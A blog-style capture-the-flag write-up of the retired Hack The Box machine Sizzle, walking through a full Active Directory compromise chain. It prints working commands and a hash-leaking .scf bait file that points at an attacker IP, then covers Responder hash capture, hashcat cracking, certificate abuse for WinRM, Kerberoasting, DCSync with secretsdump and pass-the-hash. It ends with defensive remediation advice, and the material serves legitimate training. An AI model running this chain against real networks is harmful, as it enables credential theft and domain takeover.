---
layout: post
title: "A Bait File and a Borrowed Crown"
subtitle: "HTB Sizzle, where a fake icon path makes the domain whisper a hash, a certificate forges a body, and a service account with replication rights hands you the whole vault"
date: 2019-06-08 12:00:00 +0000
description: "Sizzle is a full Active Directory tour: a poisoned shortcut leaks a hash, a certificate authority forges your identity, and a service account quietly holds the keys to replicate every secret in the domain."
image: /assets/og/a-bait-file-and-a-borrowed-crown.png
tags: [hackthebox, writeup]
---

Sizzle is the long con of the Windows world. Nobody breaks a window here. You drop a single file into a folder the domain was kind enough to leave open, name it so Windows tries to fetch an icon from your machine, and the moment a user wanders past, the domain leans over and whispers a password hash into your ear. From that one whisper you talk a certificate authority into stamping you a fake ID, you walk through a remote-management door using the ID instead of a password, you find a service account begging to be cracked, and that account turns out to hold the one permission that lets you copy every secret in the domain straight off the controller. Five moves, no exploits in the memory-corruption sense, just trust handed out like candy at every desk. This is an Insane box, and it earns the label not with one hard trick but with a chain where every link is a different flavor of the same mistake: somebody trusted something they should have checked.

```
        S I Z Z L E   ·   HTB.LOCAL
        ===========================
        open share  →  drop a .scf  →  "fetch my icon from \\10.10.14.4"
                                |
        a user walks by. windows reaches for the icon
        and hands YOU the hash on the way out.
                                |
                                v
        cert authority stamps a fake id  →  winrm lets the id in
        a service account cracks  →  it can replicate the domain
                                |
                                v
        dcsync. every password falls out of the controller at once.
                                            印
```

## 0x01 · the open door

`nmap` comes back loud and unmistakably a domain controller. The full Windows AD orchestra is playing.

```
PORT     STATE SERVICE
21/tcp   open  ftp           Microsoft ftpd
53/tcp   open  domain
80/tcp   open  http          Microsoft IIS 10.0
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
443/tcp  open  ssl/http      Microsoft IIS 10.0
464/tcp  open  kpasswd5
636/tcp  open  ldapssl
5985/tcp open  wsman         WinRM
5986/tcp open  wsmans        WinRM over TLS
```

Kerberos on 88, LDAP on 389, kpasswd on 464. That trio is the fingerprint of an Active Directory domain controller. The domain announces itself as `HTB.LOCAL`. FTP allows anonymous login but holds nothing, and the website is a single sizzling-steak GIF, a deliberate dead end. The real estate that matters is SMB on 445, because SMB lets you list shares without logging in. One of them, a "Department Shares" tree, is readable, and buried in it are two folders you can also write to. Picture a filing cabinet in a shared hallway where most drawers are locked but two are left hanging open with a pen sitting on top. Anyone can drop a note inside. On a domain, a writable folder is rarely just storage. It is a stage.

## 0x02 · the poisoned shortcut

Here is the first real move, and it is beautiful in a quiet, mean way. Windows has an old file format called the Shell Command File, extension `.scf`, the same kind of thing that used to render the "Show Desktop" button. An `.scf` can name an icon to display, and that icon path is allowed to be a UNC path, meaning a network address like `\\some-server\some-file`. When Windows Explorer opens a folder, it eagerly tries to render every icon it can find. So if you drop an `.scf` that points its icon at your own machine, the moment any user browses that folder, their computer reaches out to you to fetch the icon, and reaching out over SMB means authenticating first.

Think of it like leaving a self-addressed envelope on a counter that reads "please mail this back to me." The clerk, trying to be helpful, drops it in the post, and in doing so writes the office return address right on the front. You never asked who they were. The act of being helpful told you anyway. The "return address" Windows leaks is a NetNTLMv2 hash, a challenge-response proof of the user's password.

So you write the bait file and place it in the writable share.

```
$ cat @iceberg.scf
[Shell]
Command=2
IconFile=\\10.10.14.4\iceberg\x.ico
[Taskbar]
Command=ToggleDesktop
```

Then you sit on Responder, a tool whose entire job is to answer those incoming SMB requests and pocket whatever authentication comes with them.

```
$ responder -I tun0
[+] Listening for events...
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:ee1fd9c7201c2a31:F4FD2428...
```

A user named `amanda` browsed the folder, her machine tried to grab the icon, and her hash fell into the net. NetNTLMv2 cannot be replayed everywhere, but it can absolutely be cracked offline, and this one is weak.

```
$ hashcat -m 5600 amanda.hash rockyou.txt
AMANDA::HTB:...:Ashare1972
```

Nine seconds. `amanda` / `Ashare1972`. The domain told on itself because somebody walked past an open drawer.

## 0x03 · the forged identity

Credentials in hand, you still cannot just log in over WinRM, because this box wants client certificates, not passwords, for its remote door. That sounds like a wall until you notice the web server is hosting `/certsrv/`, the Active Directory Certificate Services enrollment page. A certificate authority exists to vouch that you are who you say you are. The problem is this one will vouch for anybody who shows up with a valid domain login, and you have one.

Think of a certificate as a laminated ID badge and the CA as the office that prints them. Normally you trust a badge because the printing office is careful about who it prints for. Here the office prints a badge for anyone holding a temp password, so you walk up as `amanda`, ask for an ID, and it hands you a real one with your face on it.

You generate a key and a signing request, submit it to the portal, and download the certificate the CA signs.

```
$ openssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr
# paste the CSR into /certsrv/ "advanced certificate request", logged in as amanda
# download the issued cert as amanda.cer
```

Now you have a key and a matching, CA-blessed certificate. WinRM on 5986 accepts that pair as proof of identity, no password required. Authenticate with the cert and a shell opens as `HTB\amanda`.

```
$ evil-winrm -i 10.10.10.103 -c amanda.cer -k amanda.key -S
*Evil-WinRM* PS> whoami
htb\amanda
```

A small note that costs real time on this box: amanda lands in Constrained Language Mode with AppLocker watching, a lockdown that blocks most of your usual tooling. You live inside the allowed Windows folders, lean on what the box already trusts, and keep your footprint to commands the policy permits. The lesson there is its own paragraph, but the path forward does not require breaking the jail. It requires reading the directory.

## 0x04 · the account that wanted to be cracked

Inside the domain, you go looking for service accounts, and Active Directory makes that easy in the worst way. Any user can ask the domain for a service ticket to any service, and part of that ticket is encrypted with the service account's password hash. So you request the ticket and crack the hash offline. This is Kerberoasting, and it is the single most reliable AD trick there is. Picture a coat check that hands you a claim ticket sealed with a wax stamp made from the owner's signet ring. You cannot read the ring directly, but you walked off with a perfect wax impression, and now you can study it at home until you reproduce the ring.

A user named `mrlky` owns a service principal, `http/sizzle`, which makes them roastable.

```
$ GetUserSPNs.py htb.local/amanda:Ashare1972 -dc-ip 10.10.10.103 -request
ServicePrincipalName  Name    MemberOf
--------------------  ------  --------------------------------
http/sizzle           mrlky   CN=Remote Management Users,...
$krb5tgs$23$*mrlky$HTB.LOCAL$...
```

Feed the ticket to hashcat in TGS-REP mode and the weak password gives out almost instantly.

```
$ hashcat -m 13100 mrlky.tgs rockyou.txt
$krb5tgs$23$...:Football#7
```

Eleven seconds. `mrlky` / `Football#7`. A second identity, and this one has teeth.

## 0x05 · the keys to the vault

Why does mrlky matter more than amanda? Because of one permission you only see when you map the domain's trust relationships. Run a collector, look at who holds replication rights, and mrlky lights up holding `GetChanges` and `GetChangesAll` over the domain object. Those two rights together are the permission a domain controller uses to sync with its peers. Whoever holds them can ask the real controller to replicate account data, and account data means password hashes. For everyone.

This is the DCSync attack. Think of a bank with several vaults that copy their contents to each other every night so they always agree. The replication right is the badge that says "I am one of those vaults, send me the nightly copy." mrlky was handed that badge by mistake, so you walk up to the controller wearing it and ask for the copy. The controller, seeing a valid badge, obliges and ships you every secret it holds.

```
$ secretsdump.py htb.local/mrlky:'Football#7'@10.10.10.103 -just-dc
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b...:f6b7160bfc91823792e0ac3a162c9267:::
krbtgt:502:aad3b...:...:::
```

There it is. The Administrator NT hash, replicated out of the controller as if you were another controller. You do not need to crack it. In Windows, the hash is the password as far as authentication cares, so you pass it straight back.

```
$ wmiexec.py -hashes :f6b7160bfc91823792e0ac3a162c9267 administrator@10.10.10.103
C:\> whoami
htb\administrator
C:\> type C:\Users\Administrator\Desktop\root.txt
████████████████████████████████
```

And the user flag along the way, claimed once the WinRM shell opened.

```
C:\> type C:\Users\amanda\Desktop\user.txt
████████████████████████████████
```

Domain owned, and not one buffer was harmed.

## 0x06 · the honest caveat

Every link in this chain is a default that someone forgot to lock down, and that is exactly why Sizzle is worth your night. The SCF trick is not a bug in any single product. It is Windows being eager to render an icon, combined with a folder that should never have been writable by random users. The certificate step is not an exploit either. The CA did precisely its job, printing a badge for an authenticated user, and the only failure was nobody asking whether amanda should be allowed to enroll at all. Kerberoasting is a feature, by design, that turns every weak service-account password into a free offline crack. And DCSync is just replication, the most boring, load-bearing thing a domain does, exposed because one service account was handed a right meant only for controllers.

None of these gets fixed by a patch on a Tuesday. There is no CVE to close. You fix Sizzle by tightening permissions, by giving service accounts long random passwords no wordlist will ever hold, by auditing who can enroll for certificates, and by treating `GetChangesAll` as the loaded gun it is. The unifying thread, the same one running under every box worth doing, is that authentication is not authorization. The domain kept proving who people were and almost never checking what they were allowed to do. amanda proved she was amanda and got a certificate. mrlky proved he was mrlky and got to replicate the planet. Identity confirmed, consequences never questioned. That gap is where the whole chain lived.

## 0x07 · outro

```
a folder left open. a file that begged for an icon.
the domain reached out to be helpful and dropped its hash.

a badge office that printed an id for anyone with a temp password.
a coat-check stamp you took home and copied.
a service account wearing a controller's badge by accident.

no exploit. five courtesies, each one extended to a stranger.
authentication kept asking "who are you." nobody asked "should you."

check the share. shorten the password. audit the right. wear black.

                                                            EOF
```

---

*HTB: Sizzle, retired 1 Jun 2019. An insane Windows box that is really a guided tour of Active Directory's politest mistakes, from a poisoned shortcut to a full DCSync. Every door was held open from the inside.*